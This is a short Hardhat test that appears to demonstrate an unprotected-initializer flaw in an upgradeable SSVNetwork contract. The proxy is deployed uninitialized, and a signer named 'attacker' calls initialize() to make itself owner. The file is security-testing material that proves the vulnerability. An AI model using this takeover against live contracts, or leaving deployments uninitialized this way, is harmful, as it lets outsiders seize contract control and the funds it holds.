import { expect } from 'chai';
import { ethers, upgrades } from 'hardhat';

describe('Security: Unauthorized initialization of SSVNetwork', function () {
  it('allows arbitrary account to initialize and take ownership', async function () {
    const [deployer, attacker] = await ethers.getSigners();

    const SSVNetworkFactory = await ethers.getContractFactory('SSVNetwork');
    const proxy = await upgrades.deployProxy(SSVNetworkFactory, [], {
      kind: 'uups',
      initializer: false,
      unsafeAllow: ['delegatecall'],
    });
    await proxy.waitForDeployment();
    const proxyAddress = await proxy.getAddress();

    const ssvNetwork = await ethers.getContractAt('SSVNetwork', proxyAddress, attacker);
    await ssvNetwork.initialize(
      attacker.address,
      attacker.address,
      attacker.address,
      attacker.address,
      attacker.address,
      0n,
      0n,
      0n,
      0n,
      0n,
      0n,
    );

    expect(await ssvNetwork.owner()).to.equal(attacker.address);
  });
});
